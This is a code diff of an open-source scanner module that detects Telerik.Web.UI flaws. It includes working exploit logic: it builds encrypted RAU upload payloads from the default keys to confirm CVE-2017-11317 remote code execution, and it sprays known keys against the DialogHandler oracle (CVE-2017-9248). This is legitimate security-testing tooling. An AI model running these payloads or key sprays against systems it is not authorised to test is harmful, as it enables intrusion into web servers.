@@ -1,23 +1,36 @@
-from sys import executable
+import base64
+
+from Crypto.Cipher import AES
+from badsecrets import modules_loaded
 
 from bbot.modules.base import BaseModule
 from bbot.core.config.models import BaseModuleConfig, Field
 
 
+Telerik_HashKey = modules_loaded["telerik_hashkey"]
+Telerik_EncryptionKey = modules_loaded["telerik_encryptionkey"]
+
+
+# Default RAU keys shipped with Telerik.Web.UI pre-R2 2017 SP2 (CVE-2017-11317).
+RAU_DEFAULT_ENC_KEY = "PrivateKeyForEncryptionOfRadAsyncUploadConfiguration"
+RAU_DEFAULT_HASH_KEY = "PrivateKeyForHashOfUploadConfiguration"
+
+
 class telerik(BaseModule):
     """
-    Test for endpoints associated with Telerik.Web.UI.dll
+    Detect Telerik.Web.UI vulnerabilities:
 
-    Telerik.Web.UI.WebResource.axd (CVE-2017-11317)
-    Telerik.Web.UI.DialogHandler.aspx (CVE-2017-9248)
-    Telerik.Web.UI.SpellCheckHandler.axd (associated with CVE-2017-9248)
-    ChartImage.axd (CVE-2019-19790)
+      - CVE-2017-11317: RadAsyncUpload insecure deserialization (RAU)
+      - CVE-2017-9248:  DialogHandler dp encryption-key leak (oracle + known keys)
+      - CVE-2019-19790: ChartImage.axd path traversal / SpellCheckHandler exposure
 
-    For the Telerik Report Server vulnerability (CVE-2024-4358) Use the Nuclei Template: (https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2024/CVE-2024-4358.yaml)
+    Handler surfaces detected: RAU (Telerik.Web.UI.WebResource.axd?type=rau),
+    DialogHandler (Telerik.Web.UI.DialogHandler.aspx and variants),
+    SpellCheckHandler (Telerik.Web.UI.SpellCheckHandler.axd), ChartImage.axd, and
+    SerializedParameters / _serializedConfiguration blobs surfacing in HTTP responses.
 
-    With exploit_RAU_crypto enabled, the module will attempt to exploit CVE-2017-11317. THIS WILL UPLOAD A (benign) FILE IF SUCCESSFUL.
-
-    Will dedupe to host by default (running against first received URL). With include_subdirs enabled, will run against every directory.
+    CVE-2024-4358 (Telerik Report Server auth bypass) is not covered here; use the
+    projectdiscovery/nuclei-templates CVE-2024-4358 template.
     """
 
     watched_events = ["URL", "HTTP_RESPONSE"]
@@ -29,7 +42,7 @@ class telerik(BaseModule):
         "author": "@liquidsec",
     }
 
-    telerikVersions = [
+    telerik_versions = [
         "2007.1423",
         "2007.1521",
         "2007.1626",
@@ -117,7 +130,7 @@ class telerik(BaseModule):
         "2017.3.913",
     ]
 
-    DialogHandlerUrls = [
+    dialoghandler_urls = [
         "Telerik.Web.UI.DialogHandler.aspx",
         "Telerik.Web.UI.DialogHandler.axd",
         "Admin/ServerSide/Telerik.Web.UI.DialogHandler.aspx",
@@ -152,273 +165,459 @@ class telerik(BaseModule):
         "WebUIDialogs/Telerik.Web.UI.DialogHandler.aspx",
     ]
 
-    RAUConfirmed = []
-
     class Config(BaseModuleConfig):
-        exploit_RAU_crypto: bool = Field(False, description="Attempt to confirm any RAU AXD detections are vulnerable")
-        include_subdirs: bool = Field(False, description="Include subdirectories in the scan (off by default)")
+        exploit_rau: bool = Field(
+            False,
+            description="Attempt to confirm RAU RCE with default keys. Uploads a benign file if successful.",
+        )
+        include_subdirs: bool = Field(
+            False,
+            description="Probe every discovered subdirectory instead of only the site root.",
+        )
+        try_known_keys: bool = Field(
+            True,
+            description="After DialogHandler detection, spray known Telerik hash/encryption keys (via badsecrets).",
+        )
+        probe_dialoghandler_oracle: bool = Field(
+            True,
+            description="After DialogHandler detection, probe for CVE-2017-9248 oracle-vulnerable state.",
+        )
+        include_machinekeys: bool = Field(
+            False,
+            description="Also spray ASP.NET machineKey values (thousands of keys, much slower).",
+        )
 
     in_scope_only = True
 
-    deps_pip = ["pycryptodome~=3.23.0"]
-
-    deps_ansible = [
-        {"name": "Create telerik dir", "file": {"state": "directory", "path": "#{BBOT_TOOLS}/telerik/"}},
-        {"file": {"state": "touch", "path": "#{BBOT_TOOLS}/telerik/testfile.txt"}},
-        {
-            "name": "Download RAU_crypto",
-            "unarchive": {
-                "src": "https://github.com/bao7uo/RAU_crypto/archive/refs/heads/master.zip",
-                "include": "RAU_crypto-master/RAU_crypto.py",
-                "dest": "#{BBOT_TOOLS}/telerik/",
-                "remote_src": True,
-            },
-        },
-    ]
+    deps_pip = ["badsecrets~=1.2.1"]
 
     _module_threads = 5
 
+    async def setup(self):
+        self._rau_confirmed = set()
+        self._enc = Telerik_EncryptionKey()
+        self._hash = Telerik_HashKey()
+        return True
+
     @staticmethod
-    def normalize_url(url):
+    def _normalize_url(url):
         return str(url.rstrip("/") + "/").lower()
 
     def _incoming_dedup_hash(self, event):
         if event.type == "URL":
             if self.config.get("include_subdirs") is True:
-                return hash(f"{event.type}{self.normalize_url(event.url)}")
-            else:
-                return hash(f"{event.type}{event.netloc}")
-        else:  # HTTP_RESPONSE
-            return hash(f"{event.type}{event.url}")
-
-    async def handle_event(self, event):
-        if event.type == "URL":
-            if self.config.get("include_subdirs"):
-                base_url = self.normalize_url(event.url)  # Use the entire URL including subdirectories
-
-            else:
-                base_url = f"{event.parsed_url.scheme}://{event.parsed_url.netloc}/"  # path will be omitted
-
-            # Check for RAU AXD Handler
-            webresource = "Telerik.Web.UI.WebResource.axd?type=rau"
-            result, _ = await self.test_detector(base_url, webresource)
-            if result:
-                if "RadAsyncUpload handler is registered succesfully" in result.text:
-                    self.verbose("Detected Telerik instance (Telerik.Web.UI.WebResource.axd?type=rau)")
-
-                    probe_data = {
-                        "rauPostData": (
-                            None,
-                            "mQheol55IDiQWWSxl+Atkc68JXWUJ6QSirwLhEwleMiw3vN4cwABE74V2fWsLGg8CFXHOP6np90M+sLrLDqFACGNvonxmgT8aBsTZPWbXErewMGNWBP34aX0DmMvXVyTEpQ6FkFhZi19cTtdYfRLI8Uc04uNSsdWnltDMQ2CX/sSLOXUFNnZdAwAXgUuprYhU28Zwh/GdgYh447ksXfAC2fuPqEJqKDDwBlltxsS/zSq8ipIg326ymB2dmOpH/P3hcAmTKOyzB0dW6a6pmJvqNVU+50DlrUC00RbBbTJwlV6Xm4s4XTvgXLvMQ6czz2OAYY18HI+HYX5uvajctj/25UR8edwu68ZCgedsD7EZHRSSthjxohxfAyrfshjcu1LnhCEd0ClowKxBS4eiaLxVxhJAdB7XcbbXxIS9WWKa7gtRMNc/jUAOlIpvOZ3N+bOQ6rsNMHv7TZk1g0bxPl99yBn9qvtAwDMNPDoADxoBSisAkIIl9mImKv7y7nAiKoj7ukApdu5XQuVo10SxwkLkqHcvEEgjxTrOlCbEbxK2/du9TgXxD9iqKyaPLHPzNZsnzCsG6qNXv0fNkeASP9tZAyvi/y1eLrpScE+J7blfT+kBkGPTTFc6Z4z6lN7GqSHofq/CDHC2S2+qdoRdC3C25V74j+Ae6MkpSfqYx4KZYNtxBAxjf9Uf3JVSiZh3X2W/7aFeimFft0h/liybSjJTzO+AwNJluI4kXqemFoHnjVFfUQViaIuk4UP0D861kCU6KIGLZLpOaa0g0KM8hmu3OjwVOy8QVXYtbx5lOmSX9h3imRzMDFRTXK25YpUJgD0/LFMgCeZLA8SCYzkThyN2d8f8n5l8iOScR47o8i8sqCp/fd3JTogSbwD7LxnHudpiw2W/OfpMGipgc6loQFoX4klQaYwKkA4w+GUzahfAJmIiukZuTLOPCPQvX4wKtLqw1YiHtuaLHvLYq2/F66QQXNrZ4SucUNED0p5TUVTvHGUbuA0zxAyYSfYVgTNZjXGguQBY7DsN1SkpCa/ltvIiGtCbHQR86OrvjJMACe0wdpMCqEg7JiGym3RrLqvmjpS&sbZRwxJ96gmXFBSbSvT0ve7jpvDoieqd6RbG+GIP0H7sO5/0ZnvheosB9jQAifuMabY7lW4UzZgr5o2iqE0tBl4SGhfWyYW7iCFXnd3aIuCnUvhT58Rp8g7kGkA/eU/s68E66KOBXNuBnokZR9cIsjE0Tt3Jfxrk018+CmVcXpjXp/RmhRwCJTgEAXQuNplb/KdkLxqDn519iRtbiU6aLZX8YctdFQBqyKVgkk8WYXxcXQ8wYnxtpEtGuBcsndUi1iPp4Od8rYY1HPWg+FIquW17YPHjfP4gO4dhZe4sd7gH0ARyGDjiYVj7ODDE0wGmwmFVdQTrDX5AaxKuJy0NbQ==",
-                        ),
-                        "file": ("blob", b"e1daf48a", "application/octet-stream"),
-                        "fileName": (None, "df8dbc7a"),
-                        "contentType": (None, "text/html"),
-                        "lastModifiedDate": (None, "2020-01-02T08:02:01.067Z"),
-                        "metadata": (
-                            None,
-                            '{"TotalChunks":1,"ChunkIndex":0,"TotalFileSize":1,"UploadID":"3ea7b19db6c5.txt"}',
-                        ),
-                    }
-
-                    version = "unknown"
-                    verbose_errors = False
-                    # send probe
-                    probe_response = await self.helpers.request(
-                        f"{event.url}{webresource}", method="POST", files=probe_data
-                    )
-
-                    if probe_response:
-                        if "Exception Details: " in probe_response.text:
-                            verbose_errors = True
-                            if (
-                                "Telerik.Web.UI.CryptoExceptionThrower.ThrowGenericCryptoException"
-                                in probe_response.text
-                            ):
-                                version = "Post-2020 (Encrypt-Then-Mac Enabled, with Generic Crypto Failure Message)"
-                            elif "Padding is invalid and cannot be removed" in probe_response.text:
-                                version = "<= 2019 (Either Pre-2017 (vulnerable), or 2017-2019 w/ Encrypt-Then-Mac)"
-
-                    description = f"Telerik RAU AXD Handler detected. Verbose Errors Enabled: [{str(verbose_errors)}] Version Guess: [{version}]"
-                    await self.emit_event(
-                        {
-                            "host": str(event.host),
-                            "url": f"{base_url}{webresource}",
-                            "description": description,
-                            "name": "Telerik Handler",
-                            "severity": "INFO",
-                            "confidence": "HIGH",
-                        },
-                        "FINDING",
-                        event,
-                        context=f"{{module}} scanned {base_url} and identified {{event.type}}: Telerik RAU AXD Handler",
-                    )
-                    if self.config.get("exploit_RAU_crypto") is True:
-                        if base_url not in self.RAUConfirmed:
-                            self.RAUConfirmed.append(base_url)
-                            root_tool_path = self.scan.helpers.tools_dir / "telerik"
-
-                            for version in self.telerikVersions:
-                                command = [
-                                    executable,
-                                    str(root_tool_path / "RAU_crypto-master/RAU_crypto.py"),
-                                    "-P",
-                                    "C:\\\\Windows\\\\Temp",
-                                    version,
-                                    str(root_tool_path / "testfile.txt"),
-                                    result.url,
-                                ]
-
-                                # Add proxy if set in the scan config
-                                if self.scan.http_proxy:
-                                    command.append(self.scan.http_proxy)
-
-                                output = await self.run_process(command)
-                                description = f"Confirmed Vulnerable Telerik (version: {str(version)})"
-                                if "fileInfo" in output.stdout:
-                                    self.debug(f"Confirmed Vulnerable Telerik (version: {str(version)}")
-                                    await self.emit_event(
-                                        {
-                                            "severity": "CRITICAL",
-                                            "confidence": "CONFIRMED",
-                                            "description": description,
-                                            "host": str(event.host),
-                                            "url": f"{base_url}{webresource}",
-                                            "name": "Telerik RCE",
-                                        },
-                                        "FINDING",
-                                        event,
-                                        context=f"{{module}} scanned {base_url} and identified critical {{event.type}}: {description}",
-                                    )
-                                    break
-
-            urls = {}
-            for dh in self.DialogHandlerUrls:
-                url = self.create_url(base_url, f"{dh}?dp=1")
-                urls[url] = dh
-
-            fail_count = 0
-            async for url, response in self.helpers.request_batch_stream(list(urls)):
-                # cancel if we run into timeouts etc.
-                if response is None:
-                    fail_count += 1
-
-                    # tolerate some random errors
-                    if fail_count < 2:
-                        continue
-                    self.debug(f"Cancelling run against {base_url} due to failed request")
-                    break
-                else:
-                    if "Cannot deserialize dialog parameters" in response.text:
-                        self.debug(f"Detected Telerik UI instance ({dh})")
-                        description = "Telerik DialogHandler detected"
-                        await self.emit_event(
-                            {
-                                "host": str(event.host),
-                                "url": f"{base_url}{dh}",
-                                "description": description,
-                                "name": "Telerik Handler",
-                                "confidence": "CONFIRMED",
-                                "severity": "INFO",
-                            },
-                            "FINDING",
-                            event,
-                        )
-                        # Once we have a match we need to stop, because the basic handler (Telerik.Web.UI.DialogHandler.aspx) usually works with a path wildcard
-                        break
-
-            spellcheckhandler = "Telerik.Web.UI.SpellCheckHandler.axd"
-            result, _ = await self.test_detector(base_url, spellcheckhandler)
-            status_code = getattr(result, "status_code", 0)
-            # The standard behavior for the spellcheck handler without parameters is a 500
-            if status_code == 500:
-                # Sometimes webapps will just return 500 for everything, so rule out the false positive
-                validate_result, _ = await self.test_detector(base_url, f"{self.helpers.rand_string()}.axd")
-                self.debug(validate_result)
-                validate_status_code = getattr(validate_result, "status_code", 0)
-                if validate_status_code not in (0, 500):
-                    self.debug("Detected Telerik UI instance (Telerik.Web.UI.SpellCheckHandler.axd)")
-                    description = "Telerik SpellCheckHandler detected"
-                    await self.emit_event(
-                        {
-                            "host": str(event.host),
-                            "url": f"{base_url}{spellcheckhandler}",
-                            "description": description,
-                            "name": "Telerik Handler",
-                            "confidence": "CONFIRMED",
-                            "severity": "INFO",
-                        },
-                        "FINDING",
-                        event,
-                        context=f"{{module}} scanned {base_url} and identified {{event.type}}: Telerik SpellCheckHandler",
-                    )
-
-            chartimagehandler = "ChartImage.axd?ImageName=bqYXJAqm315eEd6b%2bY4%2bGqZpe7a1kY0e89gfXli%2bjFw%3d"
-            result, _ = await self.test_detector(base_url, chartimagehandler)
-            status_code = getattr(result, "status_code", 0)
-            if status_code == 200:
-                chartimagehandler_error = "ChartImage.axd?ImageName="
-                result_error, _ = await self.test_detector(base_url, chartimagehandler_error)
-                error_status_code = getattr(result_error, "status_code", 0)
-                if error_status_code not in (0, 200):
-                    await self.emit_event(
-                        {
-                            "host": str(event.host),
-                            "url": f"{base_url}{chartimagehandler}",
-                            "description": "Telerik ChartImage AXD Handler Detected",
-                            "name": "Telerik Handler",
-                            "confidence": "CONFIRMED",
-                            "severity": "INFO",
-                        },
-                        "FINDING",
-                        event,
-                        context=f"{{module}} scanned {base_url} and identified {{event.type}}: Telerik ChartImage AXD Handler",
-                    )
-
-        elif event.type == "HTTP_RESPONSE":
-            resp_body = event.body
-            url = event.url
-            if resp_body:
-                if '":{"SerializedParameters":"' in resp_body:
-                    await self.emit_event(
-                        {
-                            "host": str(event.host),
-                            "url": url,
-                            "description": "Telerik DialogHandler [SerializedParameters] Detected in HTTP Response",
-                            "name": "Telerik Handler",
-                            "confidence": "CONFIRMED",
-                            "severity": "INFO",
-                        },
-                        "FINDING",
-                        event,
-                        context="{module} searched HTTP_RESPONSE and identified {event.type}: Telerik ChartImage AXD Handler",
-                    )
-                elif '"_serializedConfiguration":"' in resp_body:
-                    await self.emit_event(
-                        {
-                            "host": str(event.host),
-                            "url": url,
-                            "description": "Telerik AsyncUpload [serializedConfiguration] Detected in HTTP Response",
-                            "name": "Telerik AsyncUpload",
-                            "confidence": "CONFIRMED",
-                            "severity": "INFO",
-                        },
-                        "FINDING",
-                        event,
-                        context="{module} searched HTTP_RESPONSE and identified {event.type}: Telerik AsyncUpload",
-                    )
-
-    def create_url(self, baseurl, detector):
-        return f"{baseurl}{detector}"
-
-    async def test_detector(self, baseurl, detector):
-        result = None
-        url = self.create_url(baseurl, detector)
-        result = await self.helpers.request(url, timeout=self.scan.http_timeout)
-        return result, detector
+                return hash(f"{event.type}{self._normalize_url(event.url)}")
+            return hash(f"{event.type}{event.netloc}")
+        return hash(f"{event.type}{event.url}")
 
     async def filter_event(self, event):
         if event.type == "URL" and "endpoint" in event.tags:
             return False
+        return True
+
+    async def handle_event(self, event):
+        if event.type == "URL":
+            base_url = self._base_url(event)
+            await self._probe_rau(base_url, event)
+            dh_url = await self._probe_dialoghandler(base_url, event)
+            if dh_url:
+                kdf_mode = None
+                if self.config.get("probe_dialoghandler_oracle"):
+                    kdf_mode = await self._probe_dialoghandler_oracle(dh_url, event)
+                if self.config.get("try_known_keys"):
+                    if kdf_mode is None:
+                        kdf_mode = await self._detect_kdf_mode(dh_url)
+                    if kdf_mode in ("PBKDF1_MS", "PBKDF2"):
+                        await self._probe_dialoghandler_knownkey(dh_url, event, kdf_mode)
+            await self._probe_spellcheck(base_url, event)
+            await self._probe_chartimage(base_url, event)
+        elif event.type == "HTTP_RESPONSE":
+            await self._carve_http_response(event)
+
+    def _base_url(self, event):
+        if self.config.get("include_subdirs"):
+            return self._normalize_url(event.url)
+        return f"{event.parsed_url.scheme}://{event.parsed_url.netloc}/"
+
+    # -----------------------------------------------------------------------
+    # RAU (CVE-2017-11317)
+    # -----------------------------------------------------------------------
+
+    async def _probe_rau(self, base_url, event):
+        webresource = "Telerik.Web.UI.WebResource.axd?type=rau"
+        url = f"{base_url}{webresource}"
+        result = await self.helpers.request(url, timeout=self.scan.http_timeout)
+        if not result or "RadAsyncUpload handler is registered succesfully" not in result.text:
+            return
+        self.verbose(f"Detected Telerik RAU handler at {url}")
+
+        version, verbose_errors = await self._rau_version_fingerprint(url)
+
+        await self.emit_event(
+            {
+                "host": str(event.host),
+                "url": url,
+                "description": f"Verbose Errors Enabled: [{verbose_errors}] Version Guess: [{version}]",
+                "name": "Telerik RAU Handler",
+                "severity": "INFO",
+                "confidence": "HIGH",
+            },
+            "FINDING",
+            event,
+            context=f"{{module}} scanned {base_url} and identified {{event.type}}: Telerik RAU Handler",
+        )
+
+        if self.config.get("exploit_rau") and base_url not in self._rau_confirmed:
+            self._rau_confirmed.add(base_url)
+            await self._confirm_rau_knownkey(url, event, base_url)
+
+    async def _rau_version_fingerprint(self, url):
+        """Send a payload built with default keys and read the crypto-error banner in the response."""
+        payload = self._build_rau_multipart("2014.3.1024", RAU_DEFAULT_ENC_KEY, RAU_DEFAULT_HASH_KEY)
+        response = await self.helpers.request(url, method="POST", files=payload)
+        if not response:
+            return "unknown", False
+        text = response.text
+        if "Exception Details: " not in text:
+            return "unknown", False
+        if "Telerik.Web.UI.CryptoExceptionThrower.ThrowGenericCryptoException" in text:
+            return "Post-2020 (Encrypt-Then-Mac Enabled, with Generic Crypto Failure Message)", True
+        if "Padding is invalid and cannot be removed" in text:
+            return "<= 2019 (Either Pre-2017 (vulnerable), or 2017-2019 w/ Encrypt-Then-Mac)", True
+        return "unknown", True
+
+    async def _confirm_rau_knownkey(self, url, event, base_url):
+        """Spray default RAU keys across candidate versions. `{"fileInfo":` in the response = RCE."""
+        for version in self.telerik_versions:
+            payload = self._build_rau_multipart(version, RAU_DEFAULT_ENC_KEY, RAU_DEFAULT_HASH_KEY)
+            response = await self.helpers.request(url, method="POST", files=payload)
+            if response and '"fileInfo":' in response.text:
+                self.debug(f"Confirmed RAU RCE (version: {version})")
+                await self.emit_event(
+                    {
+                        "host": str(event.host),
+                        "url": url,
+                        "description": f"Confirmed Telerik RAU RCE (version: {version}, key: default)",
+                        "name": "Telerik RAU RCE (CVE-2017-11317)",
+                        "severity": "CRITICAL",
+                        "confidence": "CONFIRMED",
+                    },
+                    "FINDING",
+                    event,
+                    context=f"{{module}} confirmed {{event.type}}: Telerik RAU RCE at {base_url}",
+                )
+                return
+
+    def _rau_encrypt(self, plaintext, key, iv):
+        """AES-256-CBC with the null-byte-interleaved plaintext encoding Telerik RAU uses."""
+        interleaved = "".join(c + "\x00" for c in plaintext)
+        pad_len = 16 - (len(interleaved) % 16)
+        padded = interleaved + (chr(pad_len) * pad_len)
+        cipher = AES.new(key, AES.MODE_CBC, iv)
+        return base64.b64encode(cipher.encrypt(padded.encode())).decode()
+
+    def _rau_sign(self, ciphertext_b64, version, hashkey):
+        if int(version[:4]) < 2017:
+            return ciphertext_b64
+        from Crypto.Hash import HMAC, SHA256
+
+        h = HMAC.new(key=hashkey.encode(), msg=ciphertext_b64.encode(), digestmod=SHA256.new())
+        return f"{ciphertext_b64}{base64.b64encode(h.digest()).decode()}"
+
+    def _build_rau_multipart(self, version, enc_key, hash_key):
+        """Build the httpx `files=` dict for a RAU exploit payload matching `version` + keys."""
+        if int(version[:4]) <= 2017 or version == "2018.1.117":
+            key, iv = self._enc.telerik_derivekeys_PBKDF1_MS(enc_key)
         else:
-            return True
+            key, iv = self._enc.telerik_derivekeys_PBKDF2(enc_key)
+
+        enc_target_folder = self._rau_sign(self._rau_encrypt("", key, iv), version, hash_key)
+        enc_temp_folder = self._rau_sign(self._rau_encrypt("C:\\Windows\\Temp\\", key, iv), version, hash_key)
+        rau_post_data_json = (
+            f'{{"TargetFolder":"{enc_target_folder}",'
+            f'"TempTargetFolder":"{enc_temp_folder}",'
+            '"MaxFileSize":0,'
+            '"TimeToLive":{"Ticks":1440000000000,"Days":0,"Hours":40,"Minutes":0,'
+            '"Seconds":0,"Milliseconds":0,"TotalDays":1.6666666666666666,'
+            '"TotalHours":40,"TotalMinutes":2400,"TotalSeconds":144000,"TotalMilliseconds":144000000},'
+            '"UseApplicationPoolImpersonation":false}'
+        )
+        assembly_type = (
+            f"Telerik.Web.UI.AsyncUploadConfiguration, Telerik.Web.UI, Version={version}, "
+            "Culture=neutral, PublicKeyToken=121fae78165ba3d4"
+        )
+        rau_post_data = f"{self._rau_encrypt(rau_post_data_json, key, iv)}&{self._rau_encrypt(assembly_type, key, iv)}"
+        upload_id = self.helpers.rand_string(12).lower() + ".txt"
+        return {
+            "rauPostData": (None, rau_post_data),
+            "file": ("blob", b"\x00", "application/octet-stream"),
+            "fileName": (None, self.helpers.rand_string(8)),
+            "contentType": (None, "text/html"),
+            "lastModifiedDate": (None, "2020-01-02T08:02:01.067Z"),
+            "metadata": (
+                None,
+                f'{{"TotalChunks":1,"ChunkIndex":0,"TotalFileSize":1,"UploadID":"{upload_id}"}}',
+            ),
+        }
+
+    # -----------------------------------------------------------------------
+    # DialogHandler (CVE-2017-9248)
+    # -----------------------------------------------------------------------
+
+    async def _probe_dialoghandler(self, base_url, event):
+        candidates = {f"{base_url}{dh}?dp=1": dh for dh in self.dialoghandler_urls}
+
+        fail_count = 0
+        async for url, response in self.helpers.request_batch_stream(list(candidates)):
+            if response is None:
+                fail_count += 1
+                if fail_count < 2:
+                    continue
+                self.debug(f"Cancelling DialogHandler probe against {base_url} after repeated failures")
+                return None
+            if "Cannot deserialize dialog parameters" not in response.text:
+                continue
+            dh = candidates[url]
+            dh_url = f"{base_url}{dh}"
+            self.debug(f"Detected Telerik DialogHandler ({dh})")
+            await self.emit_event(
+                {
+                    "host": str(event.host),
+                    "url": dh_url,
+                    "description": "Telerik DialogHandler detected",
+                    "name": "Telerik DialogHandler",
+                    "confidence": "CONFIRMED",
+                    "severity": "INFO",
+                },
+                "FINDING",
+                event,
+                context=f"{{module}} scanned {base_url} and identified {{event.type}}: Telerik DialogHandler",
+            )
+            # The generic Telerik.Web.UI.DialogHandler.aspx often matches under a path wildcard on the target;
+            # stop after the first hit to keep noise down.
+            return dh_url
+        return None
+
+    async def _detect_kdf_mode(self, dh_url):
+        """Send an empty probe; response error tells us which KDF the target uses."""
+        response = await self.helpers.request(dh_url, method="POST", data={"dialogParametersHolder": "AAAA"})
+        if not response:
+            return None
+        return self._classify_kdf_response(response.text)
+
+    @staticmethod
+    def _classify_kdf_response(text):
+        if (
+            "Exception of type 'System.Exception' was thrown" in text
+            or "The cryptographic operation has failed!" in text
+        ):
+            return "PBKDF2"
+        if "Length cannot be less than zero" in text:
+            return "PBKDF1_MS"
+        if "Invalid length for a Base-64 char array or string" in text:
+            return "PATCHED"
+        return None
+
+    async def _probe_dialoghandler_oracle(self, dh_url, event):
+        """
+        CVE-2017-9248 quick_check: pre-patch PBKDF1_MS variants leak the
+        `Length cannot be less than zero` error string, which is the same signal
+        dp_cryptomg uses to confirm the byte-oracle key-recovery attack works.
+        """
+        kdf_mode = await self._detect_kdf_mode(dh_url)
+        if kdf_mode == "PBKDF1_MS":
+            await self.emit_event(
+                {
+                    "host": str(event.host),
+                    "url": dh_url,
+                    "description": (
+                        "Telerik DialogHandler exposes CVE-2017-9248 crypto oracle "
+                        "(PBKDF1_MS mode, key recovery viable via dp_cryptomg)"
+                    ),
+                    "name": "Telerik DialogHandler Oracle (CVE-2017-9248)",
+                    "severity": "HIGH",
+                    "confidence": "HIGH",
+                },
+                "FINDING",
+                event,
+                context=f"{{module}} confirmed CVE-2017-9248 crypto oracle at {dh_url}",
+            )
+        return kdf_mode
+
+    async def _probe_dialoghandler_knownkey(self, dh_url, event, kdf_mode):
+        include_machinekeys = self.config.get("include_machinekeys", False)
+        if kdf_mode == "PBKDF1_MS":
+            hash_key = await self._solve_dh_hashkey(dh_url, include_machinekeys)
+            if not hash_key:
+                return
+            enc_key = await self._solve_dh_enckey(dh_url, hash_key, kdf_mode, include_machinekeys)
+            if not enc_key:
+                return
+        elif kdf_mode == "PBKDF2":
+            match = await self._solve_dh_pbkdf2_combined(dh_url, include_machinekeys)
+            if not match:
+                return
+            hash_key, enc_key = match
+        else:
+            return
+
+        await self.emit_event(
+            {
+                "host": str(event.host),
+                "url": dh_url,
+                "description": (
+                    f"Telerik DialogHandler configured with a known hash/encryption key pair. "
+                    f"Hash key: [{hash_key}] Encryption key: [{enc_key}] KDF: [{kdf_mode}]"
+                ),
+                "name": "Telerik DialogHandler Known Key (CVE-2017-9248)",
+                "severity": "CRITICAL",
+                "confidence": "CONFIRMED",
+            },
+            "FINDING",
+            event,
+            context=f"{{module}} recovered a known Telerik key pair at {dh_url}",
+        )
+
+    async def _solve_dh_hashkey(self, dh_url, include_machinekeys):
+        """PBKDF1_MS mode: hashkey solves independently via 'input data is not a complete block' oracle."""
+        for probe, hash_key in self._hash.hashkey_probe_generator(include_machinekeys=include_machinekeys):
+            response = await self.helpers.request(dh_url, method="POST", data={"dialogParametersHolder": probe})
+            if not response:
+                continue
+            if "The input data is not a complete block" in response.text:
+                self.debug(f"Matched Telerik hash key: {hash_key}")
+                return hash_key
+        return None
+
+    async def _solve_dh_enckey(self, dh_url, hash_key, kdf_mode, include_machinekeys):
+        """Once hashkey is known, enckey solves via 'Index was outside the bounds of the array' oracle."""
+        for probe, enc_key in self._enc.encryptionkey_probe_generator(
+            hash_key, kdf_mode, include_machinekeys=include_machinekeys
+        ):
+            response = await self.helpers.request(dh_url, method="POST", data={"dialogParametersHolder": probe})
+            if not response:
+                continue
+            if "Index was outside the bounds of the array" in response.text:
+                self.debug(f"Matched Telerik encryption key: {enc_key}")
+                return enc_key
+        return None
+
+    async def _solve_dh_pbkdf2_combined(self, dh_url, include_machinekeys):
+        """
+        PBKDF2 mode: no per-key oracle, only response-size delta from a dummy baseline.
+        We spray hash × enc combinations; the true pair produces a response ~10+ bytes off baseline.
+        """
+        baseline_probe = self._build_pbkdf2_probe("dummy", "dummy")
+        baseline = await self.helpers.request(dh_url, method="POST", data={"dialogParametersHolder": baseline_probe})
+        if not baseline:
+            return None
+        baseline_size = len(baseline.text)
+        for hash_key in self._hash.prepare_keylist(include_machinekeys=include_machinekeys):
+            for enc_key in self._enc.prepare_keylist(include_machinekeys=include_machinekeys):
+                probe = self._build_pbkdf2_probe(hash_key, enc_key)
+                response = await self.helpers.request(dh_url, method="POST", data={"dialogParametersHolder": probe})
+                if not response:
+                    continue
+                if abs(len(response.text) - baseline_size) > 10:
+                    self.debug(f"Matched Telerik PBKDF2 key pair: {hash_key} / {enc_key}")
+                    return hash_key, enc_key
+        return None
+
+    def _build_pbkdf2_probe(self, hash_key, enc_key):
+        plaintext = "EnableAsyncUpload,False,3,True;AllowMultipleSelection,False,3,False"
+        derived_key, derived_iv = self._enc.telerik_derivekeys(enc_key, "PBKDF2")
+        ct = self._enc.telerik_encrypt(derived_key, derived_iv, plaintext)
+        return self._hash.sign_enc_dialog_params(hash_key, ct)
+
+    # -----------------------------------------------------------------------
+    # SpellCheckHandler
+    # -----------------------------------------------------------------------
+
+    async def _probe_spellcheck(self, base_url, event):
+        url = f"{base_url}Telerik.Web.UI.SpellCheckHandler.axd"
+        result = await self.helpers.request(url, timeout=self.scan.http_timeout)
+        if getattr(result, "status_code", 0) != 500:
+            return
+        # False-positive filter: sites that 500 on every unknown .axd.
+        validate_url = f"{base_url}{self.helpers.rand_string()}.axd"
+        validate_result = await self.helpers.request(validate_url, timeout=self.scan.http_timeout)
+        if getattr(validate_result, "status_code", 0) in (0, 500):
+            return
+        self.debug("Detected Telerik SpellCheckHandler")
+        await self.emit_event(
+            {
+                "host": str(event.host),
+                "url": url,
+                "description": "Telerik SpellCheckHandler detected",
+                "name": "Telerik SpellCheckHandler",
+                "confidence": "CONFIRMED",
+                "severity": "INFO",
+            },
+            "FINDING",
+            event,
+            context=f"{{module}} scanned {base_url} and identified {{event.type}}: Telerik SpellCheckHandler",
+        )
+
+    # -----------------------------------------------------------------------
+    # ChartImage.axd
+    # -----------------------------------------------------------------------
+
+    async def _probe_chartimage(self, base_url, event):
+        canary = "ChartImage.axd?ImageName=bqYXJAqm315eEd6b%2bY4%2bGqZpe7a1kY0e89gfXli%2bjFw%3d"
+        result = await self.helpers.request(f"{base_url}{canary}", timeout=self.scan.http_timeout)
+        if getattr(result, "status_code", 0) != 200:
+            return
+        error_probe = "ChartImage.axd?ImageName="
+        result_error = await self.helpers.request(f"{base_url}{error_probe}", timeout=self.scan.http_timeout)
+        if getattr(result_error, "status_code", 0) in (0, 200):
+            return
+        await self.emit_event(
+            {
+                "host": str(event.host),
+                "url": f"{base_url}{canary}",
+                "description": "Telerik ChartImage AXD Handler detected",
+                "name": "Telerik ChartImage Handler",
+                "confidence": "CONFIRMED",
+                "severity": "INFO",
+            },
+            "FINDING",
+            event,
+            context=f"{{module}} scanned {base_url} and identified {{event.type}}: Telerik ChartImage Handler",
+        )
+
+    # -----------------------------------------------------------------------
+    # Passive HTTP_RESPONSE carve
+    # -----------------------------------------------------------------------
+
+    async def _carve_http_response(self, event):
+        body = event.body
+        if not body:
+            return
+        if '":{"SerializedParameters":"' in body:
+            await self.emit_event(
+                {
+                    "host": str(event.host),
+                    "url": event.url,
+                    "description": "Telerik DialogHandler [SerializedParameters] detected in HTTP response",
+                    "name": "Telerik DialogHandler",
+                    "confidence": "CONFIRMED",
+                    "severity": "INFO",
+                },
+                "FINDING",
+                event,
